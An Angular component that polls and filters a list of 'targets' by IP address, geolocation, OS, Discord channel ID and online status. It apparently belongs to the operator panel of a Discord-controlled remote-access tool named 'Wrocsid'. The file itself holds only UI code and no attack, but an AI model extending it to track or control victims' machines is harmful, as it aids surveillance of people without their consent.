import { Component, OnInit } from '@angular/core';
import { WrocsidService } from 'src/app/services/wrocsid/wrocsid.service';
import { firstValueFrom, interval } from 'rxjs';
import { FormBuilder, FormGroup } from '@angular/forms';
import { Target } from 'src/app/Model';

@Component({
  selector: 'app-body',
  templateUrl: './body.component.html',
  styleUrls: ['./body.component.css']
})
export class BodyComponent implements OnInit {

  private panelOpenState: boolean = false
  targets$!: any
  targetsSearch$!: any
  search: string = ""
  showOnlineTargetsOnly: boolean = false

  constructor(private wrocsid:WrocsidService, private fb: FormBuilder) {}

  ngOnInit(): void {
    this.wrocsid.get_targets_data().subscribe(data => {
      this.targets$ = this.targetsSearch$ = data
    })

    interval(5 * 1000).subscribe(() => {
      this.wrocsid.get_targets_data().subscribe(data => {
        if (data) {
          if(!this.check_if_targets_equal(this.targets$, data)) {
            this.targets$ = this.targetsSearch$ = data
          }
        }
      })
    })
  }

  check_if_targets_equal(targets: any, temp_targets: any) {
    if (!targets) return false
    if(targets.length != temp_targets.length) return false

    for(let i = 0; i < targets.length; i++) {
      if(targets[i].channel_id != temp_targets[i].channel_id) return false
      if(targets[i].identifier != temp_targets[i].identifier) return false
      if(targets[i].metadata.ip != temp_targets[i].metadata.ip) return false
      if(targets[i].metadata.country != temp_targets[i].metadata.country) return false
      if(targets[i].metadata.city != temp_targets[i].metadata.city) return false
      if(targets[i].metadata.os != temp_targets[i].metadata.os) return false
      if(targets[i].metadata.country_code != temp_targets[i].metadata.country_code) return false
      if(targets[i].metadata.lat != temp_targets[i].metadata.lat) return false
      if(targets[i].metadata.lon != temp_targets[i].metadata.lon) return false
      if(targets[i].online != temp_targets[i].online) return false
    }

    return true
  }

  changePanelState() {
    this.panelOpenState = !this.panelOpenState
  }

  searchFilter(target: Target, search: string): boolean {
    if(this.search.length > 0) {
      return target.identifier.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.channel_id.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.metadata.ip.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.metadata.country.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.metadata.city.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.metadata.os.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.metadata.country_code.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.metadata.lat.toString().toLowerCase().includes(search.toLowerCase()) ||
      target.metadata.lon.toString().toLowerCase().includes(search.toLowerCase())
    }
    return true
  }

  onlineFilter(target: Target, online: Boolean): boolean {
    return target.online == online
  }

  searchQuery() {
    if (this.search.length > 0) {
      this.targetsSearch$ = this.targets$
      .filter((target: Target) => this.searchFilter(target, this.search))
    } else {
      this.targetsSearch$ = this.targets$
    }

    if(this.showOnlineTargetsOnly) {
      this.targetsSearch$ = this.targetsSearch$.filter((target: Target) => this.onlineFilter(target, this.showOnlineTargetsOnly))
    }
  }

  onlineFilterClicked() {
    if (this.showOnlineTargetsOnly) {
      this.targetsSearch$ = this.targets$
      .filter((target: Target) => this.onlineFilter(target, this.showOnlineTargetsOnly))
      .filter((target: Target) => this.searchFilter(target, this.search))
    } else {
      this.targetsSearch$ = this.targets$.filter((target: Target) => this.searchFilter(target, this.search))
    }
  }
}
